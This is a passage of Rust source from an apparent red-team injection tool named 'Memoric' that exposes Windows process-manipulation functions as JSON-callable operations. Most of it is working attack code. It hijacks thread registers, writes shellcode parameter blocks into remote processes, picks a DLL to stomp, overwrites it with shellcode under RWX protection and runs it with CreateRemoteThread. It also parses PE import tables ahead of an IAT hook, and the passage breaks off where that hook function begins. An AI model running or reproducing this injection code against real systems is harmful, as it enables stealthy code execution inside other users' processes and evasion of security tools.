        if let Some(v) = rdx {
            context.Rdx = v;
        }
        if let Some(v) = r8 {
            context.R8 = v;
        }
        if let Some(v) = r9 {
            context.R9 = v;
        }

        SetThreadContext(handle, &context).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to set thread context: {}", e))
        })?;

        // Resume thread
        ResumeThread(handle);

        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "registers_set": {
                "rcx": rcx.map(|v| format!("0x{:016X}", v)),
                "rdx": rdx.map(|v| format!("0x{:016X}", v)),
                "r8": r8.map(|v| format!("0x{:016X}", v)),
                "r9": r9.map(|v| format!("0x{:016X}", v)),
            },
            "message": "Registers set according to x64 calling convention"
        }))
    }
}

/// Shared memory parameter structure - write parameter block to remote process
/// Task 5.2: Implement shared memory parameter structure
pub fn shared_memory_params(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let params = args
        .get("params")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing params array".to_string()))?;

    // Validate parameter count (max 256)
    if params.len() > 256 {
        return Err(MemoricError::InjectionFailed(format!(
            "Too many parameters: {} (max 256)",
            params.len()
        )));
    }

    tracing::debug!(
        "Writing shared memory params for PID {} ({} params)",
        pid,
        params.len()
    );

    // Enable debug privilege for cross-process access
    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Build parameter block:
        // Layout: [param_count: u64] [param1_offset: u64] [param1_size: u64] ... [data...]
        let header_size = 8 + params.len() * 16; // count + (offset + size) per param
        let mut data_parts: Vec<Vec<u8>> = Vec::new();
        let mut total_data_size = 0usize;

        for param in params {
            let bytes: Vec<u8> = if let Some(s) = param.as_str() {
                let mut b = s.as_bytes().to_vec();
                b.push(0); // null terminator
                b
            } else if let Some(n) = param.as_u64() {
                n.to_le_bytes().to_vec()
            } else if let Some(arr) = param.as_array() {
                arr.iter()
                    .filter_map(|v| v.as_u64().map(|b| b as u8))
                    .collect()
            } else {
                let s = param.to_string();
                let mut b = s.as_bytes().to_vec();
                b.push(0);
                b
            };
            total_data_size += bytes.len();
            data_parts.push(bytes);
        }

        let total_size = header_size + total_data_size;

        // Allocate remote memory
        let mem = VirtualAllocEx(
            *handle,
            None,
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Failed to allocate parameter memory".to_string(),
            ));
        }

        // Build the parameter block
        let mut block = Vec::with_capacity(total_size);

        // Write param count
        block.extend_from_slice(&(params.len() as u64).to_le_bytes());

        // Calculate offsets and write header
        let mut current_offset = header_size;
        for part in &data_parts {
            block.extend_from_slice(&(current_offset as u64).to_le_bytes());
            block.extend_from_slice(&(part.len() as u64).to_le_bytes());
            current_offset += part.len();
        }

        // Write data
        for part in &data_parts {
            block.extend_from_slice(part);
        }

        // Write to remote process
        WriteProcessMemory(*handle, mem, block.as_ptr() as *const _, block.len(), None)
            .map_err(|e| MemoricError::InjectionFailed(format!("Failed to write params: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "pid": pid,
            "params_address": format!("0x{:016X}", mem as usize),
            "total_size": total_size,
            "param_count": params.len(),
            "layout": "Header: [count:u64][offset:u64][size:u64]... Data: [bytes...]",
            "message": "Pass params_address to shellcode via RCX or known address"
        }))
    }
}

/// Parameter serialization utilities
/// Task 5.3: Add parameter serialization utilities
pub fn serialize_params(args: &Value) -> Result<Value, MemoricError> {
    let format = args.get("format").and_then(|v| v.as_str()).unwrap_or("raw");
    let params = args
        .get("params")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing params".to_string()))?;

    tracing::debug!("Serializing {} params in format: {}", params.len(), format);

    match format {
        "raw" => {
            // Raw bytes concatenation
            let mut bytes = Vec::new();
            for param in params {
                if let Some(n) = param.as_u64() {
                    bytes.extend_from_slice(&n.to_le_bytes());
                } else if let Some(s) = param.as_str() {
                    bytes.extend_from_slice(s.as_bytes());
                    bytes.push(0);
                } else if let Some(arr) = param.as_array() {
                    for v in arr {
                        if let Some(b) = v.as_u64() {
                            bytes.push(b as u8);
                        }
                    }
                }
            }
            let hex: String = bytes.iter().map(|b| format!("{:02X}", b)).collect();

            Ok(serde_json::json!({
                "format": "raw",
                "size": bytes.len(),
                "hex": hex,
                "bytes": bytes.iter().map(|b| *b as u64).collect::<Vec<_>>()
            }))
        }
        "struct" => {
            // C-struct style: each param is 8-byte aligned
            let mut bytes = Vec::new();
            for param in params {
                if let Some(n) = param.as_u64() {
                    bytes.extend_from_slice(&n.to_le_bytes());
                } else if let Some(s) = param.as_str() {
                    let s_bytes = s.as_bytes();
                    bytes.extend_from_slice(s_bytes);
                    bytes.push(0);
                    // Align to 8 bytes
                    let total = s_bytes.len() + 1;
                    let padding = (8 - (total % 8)) % 8;
                    bytes.extend(std::iter::repeat(0u8).take(padding));
                } else if let Some(arr) = param.as_array() {
                    for v in arr {
                        if let Some(b) = v.as_u64() {
                            bytes.push(b as u8);
                        }
                    }
                    let padding = (8 - (bytes.len() % 8)) % 8;
                    bytes.extend(std::iter::repeat(0u8).take(padding));
                }
            }
            let hex: String = bytes.iter().map(|b| format!("{:02X}", b)).collect();

            Ok(serde_json::json!({
                "format": "struct",
                "size": bytes.len(),
                "hex": hex,
                "bytes": bytes.iter().map(|b| *b as u64).collect::<Vec<_>>(),
                "alignment": "8-byte aligned"
            }))
        }
        _ => Err(MemoricError::InjectionFailed(format!(
            "Unknown format: {}. Use 'raw' or 'struct'",
            format
        ))),
    }
}

// ============================================================================
// Module Stomping Implementation
// ============================================================================

/// Enumerate all loaded modules in a process
/// Task 2.1: Create module enumeration function
pub fn enumerate_modules(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W, TH32CS_SNAPMODULE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;

    tracing::debug!("Enumerating modules for PID {}", pid);

    let mut modules = Vec::new();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;

        let mut entry = MODULEENTRY32W {
            dwSize: std::mem::size_of::<MODULEENTRY32W>() as u32,
            ..Default::default()
        };

        if Module32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szModule)
                    .trim_end_matches('\0')
                    .to_string();
                let path = String::from_utf16_lossy(&entry.szExePath)
                    .trim_end_matches('\0')
                    .to_string();

                modules.push(serde_json::json!({
                    "name": name,
                    "path": path,
                    "base_address": format!("0x{:016X}", entry.modBaseAddr as usize),
                    "size": entry.modBaseSize
                }));

                if Module32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
    }

    tracing::info!("Found {} modules in PID {}", modules.len(), pid);

    Ok(serde_json::json!({
        "pid": pid,
        "count": modules.len(),
        "modules": modules
    }))
}

/// Select target DLL for module stomping
/// Task 2.2: Implement DLL selection algorithm
pub fn select_target_dll(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W, TH32CS_SNAPMODULE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode_size = args
        .get("shellcode_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(4096) as usize;

    tracing::debug!("Selecting target DLL for stomping in PID {}", pid);

    // DLLs that are safe to stomp (non-critical)
    let safe_dlls = [
        "msvcrt.dll",
        "version.dll",
        "winmm.dll",
        "wsock32.dll",
        "ws2_32.dll",
        "dbghelp.dll",
        "crypt32.dll",
    ];

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;

        let mut entry = MODULEENTRY32W {
            dwSize: std::mem::size_of::<MODULEENTRY32W>() as u32,
            ..Default::default()
        };

        let mut best_choice: Option<(String, usize, usize)> = None;

        if Module32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szModule)
                    .trim_end_matches('\0')
                    .to_lowercase();
                let size = entry.modBaseSize as usize;

                // Check if DLL is in safe list and large enough
                if safe_dlls.iter().any(|&s| s == name) && size >= shellcode_size {
                    // Prefer smaller DLLs to minimize damage
                    if best_choice.is_none() || size < best_choice.as_ref().unwrap().1 {
                        best_choice = Some((name, size, entry.modBaseAddr as usize));
                    }
                }

                if Module32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        if let Some((name, size, addr)) = best_choice {
            tracing::info!("Selected DLL for stomping: {} (size: {} bytes)", name, size);
            Ok(serde_json::json!({
                "success": true,
                "dll_name": name,
                "dll_size": size,
                "base_address": format!("0x{:016X}", addr),
                "message": format!("Selected {} as stomping target", name)
            }))
        } else {
            Err(MemoricError::InjectionFailed(
                "No suitable DLL found for stomping".to_string(),
            ))
        }
    }
}

/// Backup DLL content before stomping
/// Task 2.3: Implement DLL content backup
pub fn backup_dll_content(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let base_address = args
        .get("base_address")
        .and_then(parse_address)
        .or_else(|| args.get("address").and_then(parse_address))
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing base_address or address".to_string())
        })?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing size".to_string()))?
        as usize;

    tracing::debug!("Backing up DLL content at 0x{:016X}", base_address);

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let mut buffer = vec![0u8; size];
        let mut bytes_read = 0usize;

        ReadProcessMemory(
            *handle,
            base_address as *const _,
            buffer.as_mut_ptr() as *mut _,
            size,
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to read memory: {}", e)))?;

        // Convert to hex string for storage
        let hex_content: String = buffer.iter().map(|b| format!("{:02X}", b)).collect();

        Ok(serde_json::json!({
            "success": true,
            "base_address": format!("0x{:016X}", base_address),
            "size": bytes_read,
            "backup_hex": hex_content,
            "message": "DLL content backed up successfully"
        }))
    }
}

/// Module stomping core logic
/// Task 2.4: Implement module stomping core logic
pub fn module_stomp(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let base_address = args
        .get("base_address")
        .and_then(parse_address)
        .or_else(|| args.get("address").and_then(parse_address))
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing base_address or address".to_string())
        })?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    tracing::warn!(
        "[REDTEAM] Module stomping: PID {} at 0x{:016X}",
        pid,
        base_address
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let shellcode_bytes: Vec<u8> = shellcode
            .iter()
            .filter_map(|v| v.as_u64())
            .map(|v| v as u8)
            .collect();

        // Change protection to RWX
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            base_address as *mut _,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to change protection: {}", e))
        })?;

        // Write shellcode (stomp the DLL)
        WriteProcessMemory(
            *handle,
            base_address as *mut _,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to write shellcode: {}", e)))?;

        // Create remote thread to execute
        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(base_address)),
            None,
            0,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to create remote thread: {}", e))
        })?;

        tracing::info!("Module stomping successful");

        Ok(serde_json::json!({
            "success": true,
            "message": "Module stomped successfully",
            "pid": pid,
            "base_address": format!("0x{:016X}", base_address),
            "shellcode_size": shellcode_bytes.len()
        }))
    }
}

/// Restore DLL content after stomping
/// Task 2.5: Add DLL restoration function
pub fn restore_dll(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::VirtualProtectEx;
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let base_address = args
        .get("base_address")
        .and_then(parse_address)
        .or_else(|| args.get("address").and_then(parse_address))
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing base_address or address".to_string())
        })?;
    let backup_hex = args
        .get("backup_hex")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing backup_hex".to_string()))?;

    tracing::info!("Restoring DLL content at 0x{:016X}", base_address);

    // Convert hex string back to bytes
    let backup_bytes: Vec<u8> = backup_hex
        .as_bytes()
        .chunks(2)
        .filter_map(|chunk| {
            if chunk.len() == 2 {
                std::str::from_utf8(chunk)
                    .ok()
                    .and_then(|s| u8::from_str_radix(s, 16).ok())
            } else {
                None
            }
        })
        .collect();

    unsafe {
        // Enable debug privilege for cross-process access
        let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Change to READWRITE so WriteProcessMemory can succeed
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            base_address as *mut _,
            backup_bytes.len(),
            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to change protection to RWX: {}", e))
        })?;

        // Write original content
        WriteProcessMemory(
            *handle,
            base_address as *mut _,
            backup_bytes.as_ptr() as *const _,
            backup_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to restore content: {}", e)))?;

        // Restore original protection
        let mut tmp = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtectEx(
            *handle,
            base_address as *mut _,
            backup_bytes.len(),
            old_protect,
            &mut tmp,
        );

        Ok(serde_json::json!({
            "success": true,
            "message": "DLL content restored successfully",
            "pid": pid,
            "bytes_restored": backup_bytes.len()
        }))
    }
}

// ============================================================================
// PE Analysis & IAT Unhook
// ============================================================================

/// Parse PE headers and find IAT entry
/// Task 3.1: Implement PE structure parsing
pub fn parse_pe_headers(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D; // MZ

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let base_address = args
        .get("base_address")
        .and_then(parse_address)
        .or_else(|| args.get("address").and_then(parse_address))
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing base_address or address".to_string())
        })?;

    tracing::debug!("Parsing PE headers at 0x{:016X}", base_address);

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Read DOS header
        let mut dos_header = [0u8; 64];
        let mut bytes_read = 0usize;
        ReadProcessMemory(
            *handle,
            base_address as *const _,
            dos_header.as_mut_ptr() as *mut _,
            dos_header.len(),
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to read DOS header: {}", e)))?;

        // Check DOS signature (MZ)
        if dos_header[0] != IMAGE_DOS_SIGNATURE as u8
            || dos_header[1] != (IMAGE_DOS_SIGNATURE >> 8) as u8
        {
            return Err(MemoricError::InjectionFailed(
                "Invalid DOS signature".to_string(),
            ));
        }

        // Get PE header offset
        let e_lfanew = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]);

        // Read NT headers (first 256 bytes)
        let mut nt_headers = [0u8; 256];
        ReadProcessMemory(
            *handle,
            (base_address + e_lfanew as u64) as *const _,
            nt_headers.as_mut_ptr() as *mut _,
            nt_headers.len(),
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to read NT headers: {}", e)))?;

        // Check PE signature
        if nt_headers[0] != b'P'
            || nt_headers[1] != b'E'
            || nt_headers[2] != 0
            || nt_headers[3] != 0
        {
            return Err(MemoricError::InjectionFailed(
                "Invalid PE signature".to_string(),
            ));
        }

        // Parse optional header magic
        let optional_header_magic = u16::from_le_bytes([nt_headers[24], nt_headers[25]]);
        let is_64bit = optional_header_magic == 0x20b;

        // Get data directory for imports (index 1)
        let data_dir_offset = if is_64bit { 112 } else { 96 };
        let import_dir_rva = u32::from_le_bytes([
            nt_headers[data_dir_offset],
            nt_headers[data_dir_offset + 1],
            nt_headers[data_dir_offset + 2],
            nt_headers[data_dir_offset + 3],
        ]);
        let import_dir_size = u32::from_le_bytes([
            nt_headers[data_dir_offset + 4],
            nt_headers[data_dir_offset + 5],
            nt_headers[data_dir_offset + 6],
            nt_headers[data_dir_offset + 7],
        ]);

        Ok(serde_json::json!({
            "success": true,
            "pid": pid,
            "base_address": format!("0x{:016X}", base_address),
            "is_64bit": is_64bit,
            "pe_header_offset": e_lfanew,
            "import_directory": {
                "rva": format!("0x{:08X}", import_dir_rva),
                "size": import_dir_size,
                "address": format!("0x{:016X}", base_address + import_dir_rva as u64)
            }
        }))
    }
}

/// Find IAT entry for a specific function
/// Task 3.2: Implement IAT table location
pub fn find_iat_entry(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::ProcessStatus::{
        EnumProcessModulesEx, GetModuleBaseNameW, LIST_MODULES_ALL,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let module_name = args
        .get("module")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing module".to_string()))?;
    let function_name = args.get("function").and_then(|v| v.as_str());

    tracing::debug!(
        "Finding IAT entry: module={} function={:?}",
        module_name,
        function_name
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Find module base address by enumerating remote process modules
        let mut modules = [windows::Win32::Foundation::HMODULE::default(); 1024];
        let mut needed = 0u32;
        EnumProcessModulesEx(
            *handle,
            modules.as_mut_ptr(),
            (modules.len() * std::mem::size_of::<windows::Win32::Foundation::HMODULE>()) as u32,
            &mut needed,
            LIST_MODULES_ALL,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("EnumProcessModulesEx: {}", e)))?;

        let module_count =
            needed as usize / std::mem::size_of::<windows::Win32::Foundation::HMODULE>();
        let module_lower = module_name.to_lowercase();
        let mut mod_base = 0u64;

        for i in 0..module_count {
            let mut name_buf = [0u16; 260];
            let len = GetModuleBaseNameW(*handle, modules[i], &mut name_buf);
            if len > 0 {
                let name = String::from_utf16_lossy(&name_buf[..len as usize]).to_lowercase();
                if name == module_lower
                    || name.trim_end_matches(".dll") == module_lower.trim_end_matches(".dll")
                {
                    mod_base = modules[i].0 as u64;
                    break;
                }
            }
        }

        if mod_base == 0 {
            // Fallback: try the main executable
            if module_count > 0 {
                mod_base = modules[0].0 as u64;
            } else {
                return Err(MemoricError::InjectionFailed(format!(
                    "Module '{}' not found in target process",
                    module_name
                )));
            }
        }

        // Read DOS header
        let mut dos_header = [0u8; 64];
        ReadProcessMemory(
            *handle,
            mod_base as *const _,
            dos_header.as_mut_ptr() as *mut _,
            64,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read DOS header: {}", e)))?;

        let e_lfanew = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]) as u64;
        let nt_headers_addr = mod_base + e_lfanew;

        // Read NT headers — 264 bytes covers signature + file header + optional header
        let mut nt_buf = [0u8; 264];
        ReadProcessMemory(
            *handle,
            nt_headers_addr as *const _,
            nt_buf.as_mut_ptr() as *mut _,
            nt_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read NT headers: {}", e)))?;

        // Import directory is at optional header offset 0x78 (PE32+) — DataDirectory[1]
        let import_rva =
            u32::from_le_bytes([nt_buf[0x90], nt_buf[0x91], nt_buf[0x92], nt_buf[0x93]]) as u64;
        let import_size =
            u32::from_le_bytes([nt_buf[0x94], nt_buf[0x95], nt_buf[0x96], nt_buf[0x97]]) as u64;

        if import_rva == 0 || import_size == 0 {
            return Err(MemoricError::InjectionFailed(
                "No import directory found in module".to_string(),
            ));
        }

        let import_dir_addr = mod_base + import_rva;

        // If no specific function requested, return import directory overview
        if function_name.is_none() {
            let mut imported_dlls = Vec::new();
            let mut desc_offset = 0u64;
            loop {
                let mut desc = [0u8; 20];
                if ReadProcessMemory(
                    *handle,
                    (import_dir_addr + desc_offset) as *const _,
                    desc.as_mut_ptr() as *mut _,
                    20,
                    None,
                )
                .is_err()
                {
                    break;
                }
                let oft = u32::from_le_bytes([desc[0], desc[1], desc[2], desc[3]]) as u64;
                let ft = u32::from_le_bytes([desc[16], desc[17], desc[18], desc[19]]) as u64;
                let name_rva = u32::from_le_bytes([desc[12], desc[13], desc[14], desc[15]]) as u64;

                if (oft == 0 || ft == 0) && name_rva == 0 {
                    break;
                }

                if name_rva != 0 {
                    let mut dll_name_buf = [0u8; 256];
                    if ReadProcessMemory(
                        *handle,
                        (mod_base + name_rva) as *const _,
                        dll_name_buf.as_mut_ptr() as *mut _,
                        256,
                        None,
                    )
                    .is_ok()
                    {
                        let dll_name = std::ffi::CStr::from_bytes_until_nul(&dll_name_buf)
                            .map(|s| s.to_string_lossy().to_string())
                            .unwrap_or_default();
                        if !dll_name.is_empty() {
                            // Count imports for this DLL
                            let mut func_count = 0u32;
                            if ft != 0 {
                                let mut thunk_idx = 0u64;
                                loop {
                                    let mut entry_val = 0u64;
                                    let entry_addr = mod_base + ft + thunk_idx * 8;
                                    if ReadProcessMemory(
                                        *handle,
                                        entry_addr as *const _,
                                        &mut entry_val as *mut _ as *mut _,
                                        8,
                                        None,
                                    )
                                    .is_err()
                                        || entry_val == 0
                                    {
                                        break;
                                    }
                                    func_count += 1;
                                    thunk_idx += 1;
                                }
                            }
                            imported_dlls.push(serde_json::json!({
                                "dll": dll_name,
                                "function_count": func_count,
                                "iat_rva": format!("0x{:08X}", ft)
                            }));
                        }
                    }
                }
                desc_offset += 20;
            }

            return Ok(serde_json::json!({
                "success": true,
                "module": module_name,
                "module_base": format!("0x{:016X}", mod_base),
                "import_directory": {
                    "rva": format!("0x{:08X}", import_rva),
                    "size": import_size,
                    "address": format!("0x{:016X}", import_dir_addr)
                },
                "imported_dlls": imported_dlls,
                "message": "Import directory overview. Use function=<name> to locate a specific IAT entry."
            }));
        }

        // Find specific function in IAT
        let target_fn = function_name.unwrap();
        let mut desc_offset = 0u64;
        let mut found_entry: Option<serde_json::Value> = None;

        loop {
            let mut desc = [0u8; 20];
            if ReadProcessMemory(
                *handle,
                (import_dir_addr + desc_offset) as *const _,
                desc.as_mut_ptr() as *mut _,
                20,
                None,
            )
            .is_err()
            {
                break;
            }

            let original_first_thunk =
                u32::from_le_bytes([desc[0], desc[1], desc[2], desc[3]]) as u64;
            let name_rva = u32::from_le_bytes([desc[12], desc[13], desc[14], desc[15]]) as u64;
            let first_thunk = u32::from_le_bytes([desc[16], desc[17], desc[18], desc[19]]) as u64;

            if (original_first_thunk == 0 || first_thunk == 0) && name_rva == 0 {
                break;
            }

            // Read DLL name
            let mut dll_name = String::new();
            if name_rva != 0 {
                let mut dll_name_buf = [0u8; 256];
                if ReadProcessMemory(
                    *handle,
                    (mod_base + name_rva) as *const _,
                    dll_name_buf.as_mut_ptr() as *mut _,
                    256,
                    None,
                )
                .is_ok()
                {
                    dll_name = std::ffi::CStr::from_bytes_until_nul(&dll_name_buf)
                        .map(|s| s.to_string_lossy().to_string())
                        .unwrap_or_default();
                }
            }

            // Walk thunks to find the function
            if !dll_name.is_empty() && first_thunk != 0 {
                let mut thunk_idx = 0u64;
                loop {
                    let oft_addr = mod_base + original_first_thunk + thunk_idx * 8;
                    let ft_addr = mod_base + first_thunk + thunk_idx * 8;

                    let mut oft_val = 0u64;
                    let mut ft_val = 0u64;

                    if ReadProcessMemory(
                        *handle,
                        oft_addr as *const _,
                        &mut oft_val as *mut _ as *mut _,
                        8,
                        None,
                    )
                    .is_err()
                        || oft_val == 0
                    {
                        break;
                    }

                    let fn_name: String;
                    if oft_val & 0x8000000000000000 != 0 {
                        // Import by ordinal
                        fn_name = format!("#{}", oft_val & 0xFFFF);
                    } else {
                        // Import by name — skip 2-byte hint
                        let hint_name_addr = mod_base + (oft_val & 0x7FFFFFFF) + 2;
                        let mut fn_name_buf = [0u8; 256];
                        if ReadProcessMemory(
                            *handle,
                            hint_name_addr as *const _,
                            fn_name_buf.as_mut_ptr() as *mut _,
                            256,
                            None,
                        )
                        .is_ok()
                        {
                            fn_name = std::ffi::CStr::from_bytes_until_nul(&fn_name_buf)
                                .map(|s| s.to_string_lossy().to_string())
                                .unwrap_or_default();
                        } else {
                            thunk_idx += 1;
                            continue;
                        }
                    }

                    if fn_name.eq_ignore_ascii_case(target_fn) {
                        let _ = ReadProcessMemory(
                            *handle,
                            ft_addr as *const _,
                            &mut ft_val as *mut _ as *mut _,
                            8,
                            None,
                        );
                        found_entry = Some(serde_json::json!({
                            "function": fn_name,
                            "from_dll": dll_name,
                            "iat_entry_address": format!("0x{:016X}", ft_addr),
                            "current_value": format!("0x{:016X}", ft_val),
                            "ordinal_thunk_index": thunk_idx,
                        }));
                        break;
                    }

                    thunk_idx += 1;
                }
            }

            if found_entry.is_some() {
                break;
            }
            desc_offset += 20;
        }

        match found_entry {
            Some(entry) => Ok(serde_json::json!({
                "success": true,
                "module": module_name,
                "module_base": format!("0x{:016X}", mod_base),
                "import_directory_rva": format!("0x{:08X}", import_rva),
                "entry": entry,
                "message": format!("IAT entry for {} located at {}", target_fn, entry["iat_entry_address"])
            })),
            None => Err(MemoricError::InjectionFailed(format!(
                "Function '{}' not found in import table of '{}'",
                target_fn, module_name
            ))),
        }
    }
}

/// Hook a function via IAT
/// Task 3.3: Implement IAT hook core logic
pub fn iat_unhook(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
